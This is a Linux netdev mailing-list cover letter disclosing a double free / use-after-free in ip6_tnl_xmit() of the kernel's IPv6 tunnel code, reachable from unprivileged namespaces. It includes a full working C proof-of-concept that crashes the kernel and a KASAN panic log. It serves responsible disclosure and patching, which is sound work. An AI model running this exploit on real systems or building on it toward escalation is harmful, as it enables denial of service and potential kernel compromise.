Received: from mail-pf1-f176.google.com (mail-pf1-f176.google.com [209.85.210.176])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E9C5639182A
	for <netdev@vger.kernel.org>; Mon,  3 Aug 2026 05:34:58 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.176
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785735301; cv=none; b=V2285VL7oG6uS9A+IOW6WN0JVtQOIql40jexmdHCzYJLpu3t9KYjLBLO6UkZD9C8w3se1K2N8YjUQGDSmKA35lI7tcu9SQqDA9Q6k5WWSbQIO91ZENdswUY2iKWzNuuDYrbGb4ka9yvRRWN0I8UvUJPfM/VHFxCJE6PZQqUDDVw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785735301; c=relaxed/simple;
	bh=r1ZzRWwR0hkpEeKPfO+oUH/vkkP8JmiaP2PzsUn+YNc=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Cp1+0QqO+nGzsef3FC2YdxqaRAuUsBhoi5gFuLFvlRwFRqra3DuskCFB9NvgaoOJeknVwDuIAkghl9s0cKH3brFtq3wUNSIAGtXoBwfM5b8z7bAGN4B+lueq9EnFiSTiQwvBfQRT+lW53ruDjZpo8sa2GWR4FNrsjG4LujkMIN8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Q3NRNebp; arc=none smtp.client-ip=209.85.210.176
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Q3NRNebp"
Received: by mail-pf1-f176.google.com with SMTP id d2e1a72fcca58-84847482584so1854470b3a.0
        for <netdev@vger.kernel.org>; Sun, 02 Aug 2026 22:34:58 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785735298; x=1786340098; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=N3UjETFDXOZ3rznpcg71ALPdT0uiRSPohr+ZCOen7zI=;
        b=Q3NRNebpyFnb/XYXhiqHzmKrtEjfTyqCXZxtvVagLVyiUImHY2WdbDGOxYgiOhztpm
         B/XhZ4P+8oewXpiZ55mWdXCFUNPtNYRtx3WxUvBqZgi4dugeIYb69sx/57JO4oNzBFTM
         OJCs4Ky6YO2nJOAGlYpim3DbKNgK/pw+95qoNt9RfrWhFc6CrHqVGDgMPwVBSWk7S5j8
         sl478vvVYzId/QxIt7tcZQus6+Q2ce/Ts5sitPCZNqF1erayJWiY10VkYEhL+sCximMf
         GwNyNcJZrNpQ04LUvstkJcTTn8UV5ifiPXDwHwtzy6rVKGlZM9hob9PmUnsxX/B8XCUd
         do3Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785735298; x=1786340098;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=N3UjETFDXOZ3rznpcg71ALPdT0uiRSPohr+ZCOen7zI=;
        b=sIeG9nvdg9aPIRaFC+FlGwVP6nwq6GuoCdjhM3A6KBX7UnJi2lGAVrvw7LVfNdni7u
         IKTBIjBGlN6XEB/vo1mLyuSMSMhk5GjRJ+LNVbMAOV9e396ZcQCJdx/MqtSuT/PAgwog
         Ws0tSdmovsJ7BQIpyKkYvwHtGRR+py1nIwZorhgk4cF2+NletkeUlz6WuRJvKn15rS/J
         thV/K+EQmWL6FRuz0Htsi/mq+RaxXbs0Z+cug7WrYFyV/e10OAEEpys1K2TEWSmfBzzb
         6a2mcVLkOg3FLq1MMAFdNgu85pFCma5RkxctaS30t6CFUlVpiB/33wTlzn2Ys+gD3597
         r/pg==
X-Gm-Message-State: AOJu0Yz/PeovF/IiywZVHu0x85DHREU4/4JE9t2RHm3ECo8JIUHEHpyy
	wnfdNwNX3381l4zscxhbjI5hmUSrmYFO2NHEM8OUqROeK8Pvn4FLdbl72tHuvCsQjuV6HO6ZFMv
	W9H1Bu/AamkvF5w==
X-Gm-Gg: AR+sD12EcD8Ih0NZY9l9uwWNaCZ5L/+VvqVzY9Lw0e3BkjygbWepK7D0MZtnMY8oHoA
	PrknvgqaYGJH85+JryeIlqHTcv3F1d/22PjFODZ8bmkrIVU9EgN36mRccqwSDKzy8HwYMgEBEQ6
	NMLNeZwhwvOC4Ka9KSBYw/5B1WifBOeaYKfFu/eMJxdXLYaPOjmdJ+bTgwSsHeZUOLTs2zFyMxu
	cbsRO8QYeY5eyHAHibkYpirRZa+8YvHLyZV+iGk2keESMrRMyMS7hAeAO6mmZE1nJBWe2KGVylX
	1QfCY8Shv4nO0ZcqEi0n+vQXAjC1iQZW4T+kg6giov8/+HojtLU5Ddf+xmRFotPCLtS6P9Y5QJ3
	lOtAzjYTjnDG6hXN1ZL4udWRk+5GD6KF65IClZrA8rLfsl1VYrBPtE8NFiDQi2n89nV7905b42q
	4RrdTH6Dbq14DBE2MjCZazvFdXQw+R2vtUF0P2Cwg5EOgMl1YzHnnp2BkgdEClRIYw6ovJyqEwR
	w==
X-Received: by 2002:a05:6a00:1d8c:b0:845:df5c:2567 with SMTP id d2e1a72fcca58-84ee492fc27mr7135553b3a.25.1785735297978;
        Sun, 02 Aug 2026 22:34:57 -0700 (PDT)
Received: from Roxy.localdomain ([202.8.9.242])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84edbe57020sm3169178b3a.17.2026.08.02.22.34.54
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 02 Aug 2026 22:34:57 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	tom@herbertland.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] ip6_tunnel: use skb_cow_head() in ip6_tnl_xmit()
Date: Mon,  3 Aug 2026 13:34:45 +0800
Message-ID: <cover.1785734738.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/ip6_tunnel.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ip6_tnl_xmit() expands skb headroom with skb_realloc_headroom() when the
incoming packet does not have enough room for the outer IPv6 and encap
headers. In that path it copies skb->sk ownership to the replacement skb,
calls consume_skb() on the original skb, and then keeps the replacement
only in its local skb variable.

The helper can still fail after that replacement. A collect-metadata
ip6tnl with non-NONE encap is rejected later in the same function, and
ip6_tnl_encap() can also return an error after the reallocation path.

Its callers still own only the original skb pointer. When ip6_tnl_xmit()
returns an error, ip6_tnl_start_xmit() and the IPv6 GRE xmit paths free
that stale caller-owned skb, which triggers a double free / use-after-free.

The attached PoC creates a collect-metadata ip6tnl device with FOU encap
through raw rtnetlink, then uses tc tunnel_key + mirred to push a packet
through ip6_tnl_start_xmit() until the stale skb free is hit.

The attached PoC is the validated root reproduction on our setup. The
same kernel entry points are namespace-scoped, so the bug is reachable
from user and net namespaces with CAP_NET_ADMIN in the target netns.

Reproducer:

    gcc -O2 -Wall -Wextra -o poc poc.c
    ./poc 1

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_link.h>
#include <linux/if_tunnel.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define IP_CMD "/usr/sbin/ip"
#define TC_CMD "/usr/sbin/tc"
#define PING_CMD "/usr/bin/ping"

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

struct nl_req {
	struct nlmsghdr nlh;
	struct ifinfomsg ifm;
	char buf[2048];
};

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void die_msg(const char *msg)
{
	fprintf(stderr, "%s\n", msg);
	exit(1);
}

static void run_cmd(const char *cmd)
{
	int rc = system(cmd);

	if (rc == -1)
		die("system");
	if (!WIFEXITED(rc) || WEXITSTATUS(rc) != 0) {
		fprintf(stderr, "command failed: %s\n", cmd);
		exit(1);
	}
}

static struct nlattr *nla_add(struct nlmsghdr *nlh, size_t maxlen, int type,
			      const void *data, size_t len)
{
	size_t attr_len = NLA_ALIGN(sizeof(struct nlattr)) + NLA_ALIGN(len);
	size_t new_len = NLMSG_ALIGN(nlh->nlmsg_len) + attr_len;
	struct nlattr *nla;

	if (new_len > maxlen)
		die_msg("netlink message too large");

	nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	nla->nla_type = type;
	nla->nla_len = sizeof(*nla) + len;
	if (len && data)
		memcpy((char *)nla + sizeof(*nla), data, len);
	memset((char *)nla + nla->nla_len, 0, NLA_ALIGN(len) - len);
	nlh->nlmsg_len = new_len;
	return nla;
}

static struct nlattr *nla_nest_start(struct nlmsghdr *nlh, size_t maxlen,
				     int type)
{
	return nla_add(nlh, maxlen, type, NULL, 0);
}

static void nla_nest_end(struct nlmsghdr *nlh, struct nlattr *nest)
{
	nest->nla_len = (char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)nest;
}

static int nl_talk(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	char resp[4096];
	ssize_t len;
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &sa,
		.msg_namelen = sizeof(sa),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};

	if (sendmsg(fd, &msg, 0) < 0)
		die("sendmsg");

	iov.iov_base = resp;
	iov.iov_len = sizeof(resp);
	len = recvmsg(fd, &msg, 0);
	if (len < 0)
		die("recvmsg");

	for (struct nlmsghdr *h = (struct nlmsghdr *)resp;
	     NLMSG_OK(h, len);
	     h = NLMSG_NEXT(h, len)) {
		if (h->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);

			if (err->error == 0)
				return 0;
			errno = -err->error;
			return -1;
		}
	}

	errno = EPROTO;
	return -1;
}

static void create_ip6tnl_external(const char *ifname, const char *kind,
				   uint16_t encap_type, uint16_t encap_flags,
				   uint16_t encap_dport)
{
	struct nl_req req;
	struct nlattr *linkinfo, *infodata;
	int fd;
	uint16_t be_dport = htons(encap_dport);

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.ifm));
	req.nlh.nlmsg_type = RTM_NEWLINK;
	req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
	req.ifm.ifi_family = AF_UNSPEC;

	nla_add(&req.nlh, sizeof(req), IFLA_IFNAME, ifname, strlen(ifname) + 1);
	linkinfo = nla_nest_start(&req.nlh, sizeof(req), IFLA_LINKINFO);
	nla_add(&req.nlh, sizeof(req), IFLA_INFO_KIND, kind, strlen(kind) + 1);
	infodata = nla_nest_start(&req.nlh, sizeof(req), IFLA_INFO_DATA);
	nla_add(&req.nlh, sizeof(req), IFLA_IPTUN_COLLECT_METADATA, NULL, 0);
	nla_add(&req.nlh, sizeof(req), IFLA_IPTUN_PROTO, &(uint8_t){0}, sizeof(uint8_t));
	nla_add(&req.nlh, sizeof(req), IFLA_IPTUN_ENCAP_TYPE, &encap_type, sizeof(encap_type));
	nla_add(&req.nlh, sizeof(req), IFLA_IPTUN_ENCAP_FLAGS, &encap_flags, sizeof(encap_flags));
	nla_add(&req.nlh, sizeof(req), IFLA_IPTUN_ENCAP_DPORT, &be_dport, sizeof(be_dport));
	nla_nest_end(&req.nlh, infodata);
	nla_nest_end(&req.nlh, linkinfo);

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die("socket(AF_NETLINK)");

	if (nl_talk(fd, &req.nlh) < 0)
		die("RTM_NEWLINK ip6tnl");
	close(fd);
}

static void cleanup(void)
{
	run_cmd(TC_CMD " qdisc del dev veth0 clsact 2>/dev/null || true");
	run_cmd(IP_CMD " link del ip6t 2>/dev/null || true");
	run_cmd(IP_CMD " link del veth0 2>/dev/null || true");
	run_cmd(IP_CMD " netns del ns1 2>/dev/null || true");
}

int main(int argc, char **argv)
{
	uint16_t encap_flags = 0;
	uint16_t encap_type = TUNNEL_ENCAP_FOU;
	bool same_netns = false;
	int i;
	int loops = 1;

	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--gue-remcsum")) {
			encap_type = TUNNEL_ENCAP_GUE;
			encap_flags = TUNNEL_ENCAP_FLAG_REMCSUM;
			continue;
		}
		if (!strcmp(argv[i], "--same-netns")) {
			same_netns = true;
			continue;
		}
		loops = atoi(argv[i]);
	}
	if (loops <= 0)
		loops = 1;

	cleanup();
	run_cmd(IP_CMD " link add veth0 type veth peer name veth1");
	run_cmd(IP_CMD " link set veth0 up");
	run_cmd(IP_CMD " addr add 192.0.2.1/24 dev veth0");
	run_cmd(IP_CMD " -6 addr add 2001:db8::1/64 dev veth0 nodad");
	if (same_netns) {
		run_cmd(IP_CMD " link set veth1 up");
		run_cmd(IP_CMD " addr add 192.0.2.2/24 dev veth1");
		run_cmd(IP_CMD " route add default via 192.0.2.1 dev veth1");
		run_cmd(IP_CMD " -6 route add 2001:db8::2/128 dev veth0");
	} else {
		run_cmd(IP_CMD " netns add ns1");
		run_cmd(IP_CMD " link set veth1 netns ns1");
		run_cmd(IP_CMD " -n ns1 link set lo up");
		run_cmd(IP_CMD " -n ns1 link set veth1 up");
		run_cmd(IP_CMD " -n ns1 addr add 192.0.2.2/24 dev veth1");
		run_cmd(IP_CMD " -n ns1 -6 addr add 2001:db8::2/64 dev veth1 nodad");
		run_cmd(IP_CMD " -n ns1 route add default via 192.0.2.1 dev veth1");
	}

	create_ip6tnl_external("ip6t", "ip6tnl", encap_type, encap_flags, 5555);
	run_cmd(IP_CMD " link set ip6t up");
	run_cmd(TC_CMD " qdisc add dev veth0 clsact");
	run_cmd(TC_CMD " filter add dev veth0 ingress protocol ip flower dst_ip 198.51.100.1/32 "
		"action tunnel_key set src_ip 2001:db8::1 dst_ip 2001:db8::2 id 0 ttl 64 "
		"action mirred egress redirect dev ip6t");
	run_cmd(IP_CMD " -d -j link show ip6t");

	for (i = 0; i < loops; i++) {
		if (same_netns)
			run_cmd(PING_CMD " -I 192.0.2.2 -c1 -W1 198.51.100.1 >/dev/null 2>&1 || true");
		else
			run_cmd(IP_CMD " netns exec ns1 " PING_CMD " -c1 -W1 198.51.100.1 >/dev/null 2>&1 || true");
	}

	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  689.865132][    C3] page_owner tracks the page as allocated
[  689.865591][    C3] page last allocated via order 1, migratetype Unmovable, gfp_mask 0x52820(GFP_ATOMIC|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP), pid 18, tgid 18 (ksoftirqd/0), ts 123004839440, free_ts 121667874628
[  689.867045][    C3] page last free pid 10093 tgid 10093 stack trace:
[  689.867728][    C3] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  689.868223][    C3] CPU: 3 UID: 0 PID: 11593 Comm: ping Not tainted 6.12.95 #2
[  689.868832][    C3] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  689.869629][    C3] Call Trace:
[  689.869886][    C3]  <IRQ>
[  689.870129][    C3]  panic+0x533/0x610
[  689.870409][    C3]  ? __pfx_panic+0x10/0x10
[  689.870735][    C3]  ? irqentry_exit+0x3b/0x90
[  689.871129][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.871586][    C3]  ? sk_skb_reason_drop+0x34/0x100
[  689.871964][    C3]  ? sk_skb_reason_drop+0x34/0x100
[  689.872326][    C3]  check_panic_on_warn+0x61/0x80
[  689.872729][    C3]  end_report+0x11b/0x180
[  689.873038][    C3]  kasan_report+0xe8/0x110
[  689.873330][    C3]  ? sk_skb_reason_drop+0x34/0x100
[  689.873679][    C3]  kasan_check_range+0xf4/0x1a0
[  689.874076][    C3]  sk_skb_reason_drop+0x34/0x100
[  689.874442][    C3]  ip6_tnl_start_xmit+0x5b3/0x1650
[  689.874789][    C3]  ? __pfx_ip6_tnl_start_xmit+0x10/0x10
[  689.875239][    C3]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  689.875615][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.876016][    C3]  ? rcu_is_watching+0x12/0xc0
[  689.876408][    C3]  dev_hard_start_xmit+0x115/0x5e0
[  689.876763][    C3]  __dev_queue_xmit+0x2990/0x37e0
[  689.877130][    C3]  ? trace_lock_acquire+0x145/0x1c0
[  689.877508][    C3]  ? fl_mask_lookup+0x288/0xd00
[  689.877924][    C3]  ? __pfx___dev_queue_xmit+0x10/0x10
[  689.878285][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.878663][    C3]  ? fl_mask_lookup+0x2d0/0xd00
[  689.879110][    C3]  ? __lock_acquire+0xc96/0x3c40
[  689.879449][    C3]  ? __pfx_fl_mask_lookup+0x10/0x10
[  689.879826][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.880271][    C3]  tcf_mirred_to_dev+0x97c/0xf70
[  689.880655][    C3]  tcf_mirred_act+0x803/0x13c0
[  689.880996][    C3]  ? __pfx_tcf_mirred_act+0x10/0x10
[  689.881352][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.881803][    C3]  ? rcu_lockdep_current_cpu_online+0x38/0x150
[  689.882251][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.882677][    C3]  tcf_action_exec+0x15e/0x790
[  689.883091][    C3]  fl_classify+0x54a/0x6b0
[  689.883408][    C3]  ? __pfx_fl_classify+0x10/0x10
[  689.883784][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.884280][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.884654][    C3]  ? kasan_save_stack+0x42/0x60
[  689.884994][    C3]  ? kasan_save_stack+0x33/0x60
[  689.885403][    C3]  ? kasan_save_track+0x14/0x30
[  689.885733][    C3]  ? kasan_save_free_info+0x3b/0x60
[  689.886084][    C3]  ? __kasan_slab_free+0x4f/0x70
[  689.886422][    C3]  ? kmem_cache_free+0x14d/0x4a0
[  689.886819][    C3]  ? arp_process+0x9cc/0x23d0
[  689.887142][    C3]  ? __netif_receive_skb_one_core+0x16d/0x1b0
[  689.887547][    C3]  ? process_backlog+0x3cc/0x1400
[  689.887970][    C3]  ? __napi_poll.constprop.0+0xa1/0x440
[  689.888376][    C3]  ? net_rx_action+0x928/0xe20
[  689.888701][    C3]  tcf_classify+0x3b4/0x1280
[  689.889032][    C3]  tc_run+0x3de/0x7a0
[  689.889365][    C3]  ? __pfx_tc_run+0x10/0x10
[  689.889664][    C3]  ? mark_lock+0xb5/0xc60
[  689.889972][    C3]  ? process_backlog+0x38c/0x1400
[  689.890310][    C3]  __netif_receive_skb_core.constprop.0+0x1335/0x3820
[  689.890838][    C3]  ? kasan_quarantine_put+0x10a/0x240
[  689.891215][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.891594][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.892035][    C3]  ? hlock_class+0x4e/0x130
[  689.892336][    C3]  ? __pfx___netif_receive_skb_core.constprop.0+0x10/0x10
[  689.892829][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.893282][    C3]  ? hlock_class+0x4e/0x130
[  689.893583][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.893979][    C3]  ? mark_lock+0xb5/0xc60
[  689.894324][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.894718][    C3]  ? lock_acquire.part.0+0x119/0x370
[  689.895102][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.895505][    C3]  ? process_backlog+0x38c/0x1400
[  689.895908][    C3]  __netif_receive_skb_one_core+0xaf/0x1b0
[  689.896305][    C3]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  689.896743][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.897320][    C3]  ? lock_acquire+0x2f/0xb0
[  689.897626][    C3]  ? process_backlog+0x38c/0x1400
[  689.897975][    C3]  process_backlog+0x3cc/0x1400
[  689.898372][    C3]  __napi_poll.constprop.0+0xa1/0x440
[  689.898746][    C3]  net_rx_action+0x928/0xe20
[  689.899073][    C3]  ? __pfx_net_rx_action+0x10/0x10
[  689.899439][    C3]  ? trace_sched_wakeup+0xde/0x130
[  689.899840][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.900220][    C3]  ? do_raw_spin_unlock+0x177/0x230
[  689.900606][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.901112][    C3]  ? _raw_spin_unlock_irqrestore+0x40/0x80
[  689.901512][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.901941][    C3]  ? mark_held_locks+0x94/0xe0
[  689.902335][    C3]  handle_softirqs+0x2ae/0x8b0
[  689.902660][    C3]  ? __pfx_handle_softirqs+0x10/0x10
[  689.903020][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.903421][    C3]  ? __neigh_event_send+0x2bc/0x11b0
[  689.903839][    C3]  do_softirq+0xb2/0xf0
[  689.904222][    C3]  </IRQ>
[  689.904430][    C3]  <TASK>
[  689.904629][    C3]  __local_bh_enable_ip+0x101/0x120
[  689.905051][    C3]  __neigh_event_send+0x2c1/0x11b0
[  689.905398][    C3]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  689.905785][    C3]  neigh_resolve_output+0x491/0x8b0
[  689.906265][    C3]  ? ip_finish_output2+0x2cc/0x1eb0
[  689.906616][    C3]  ? __pfx____neigh_create+0x10/0x10
[  689.906996][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.907405][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.907829][    C3]  ip_finish_output2+0x6a2/0x1eb0
[  689.908158][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.908529][    C3]  ? ip_skb_dst_mtu+0x49b/0x9c0
[  689.908930][    C3]  ? __pfx_ip_skb_dst_mtu+0x10/0x10
[  689.909283][    C3]  ? __pfx_ip_finish_output2+0x10/0x10
[  689.909646][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.910090][    C3]  ? __ip_finish_output+0x15d/0x570
[  689.910433][    C3]  ip_output+0x171/0x3b0
[  689.910735][    C3]  ip_push_pending_frames+0x1e6/0x250
[  689.911120][    C3]  raw_sendmsg+0x1041/0x3130
[  689.911491][    C3]  ? __pfx_raw_sendmsg+0x10/0x10
[  689.911838][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.912213][    C3]  ? tomoyo_check_inet_address+0x3b0/0x650
[  689.912674][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.913066][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.913439][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.913907][    C3]  ? __pfx_lock_release+0x10/0x10
[  689.914266][    C3]  ? __sys_sendto+0x32e/0x3a0
[  689.914581][    C3]  __sys_sendto+0x32e/0x3a0
[  689.914923][    C3]  ? __pfx___sys_sendto+0x10/0x10
[  689.915338][    C3]  ? reacquire_held_locks+0x20b/0x4c0
[  689.915691][    C3]  ? do_user_addr_fault+0x854/0xe10
[  689.916062][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.916509][    C3]  __x64_sys_sendto+0xe0/0x1c0
[  689.916839][    C3]  ? do_syscall_64+0x93/0x270
[  689.917162][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  689.917546][    C3]  ? lockdep_hardirqs_on+0x7b/0x110
[  689.917948][    C3]  do_syscall_64+0xc7/0x270
[  689.918250][    C3]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  689.918633][    C3] RIP: 0033:0x7f6982502687
[  689.919046][    C3] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  689.920584][    C3] RSP: 002b:00007ffe49dab380 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  689.921193][    C3] RAX: ffffffffffffffda RBX: 00007f698228a380 RCX: 00007f6982502687
[  689.921808][    C3] RDX: 0000000000000040 RSI: 00005644033df364 RDI: 0000000000000003
[  689.922330][    C3] RBP: 00005644033df364 R08: 00005644033f15d8 R09: 0000000000000010
[  689.922917][    C3] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000040
[  689.923435][    C3] R13: 00007ffe49dacac0 R14: 00005644033df364 R15: 0000001d00000001
[  689.924009][    C3]  </TASK>
[  689.924563][    C3] Kernel Offset: disabled
[  689.924882][    C3] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ip6_tunnel: use skb_cow_head() in ip6_tnl_xmit()

 net/ipv6/ip6_tunnel.c | 15 ++-------------
 1 file changed, 2 insertions(+), 13 deletions(-)

-- 
2.43.0

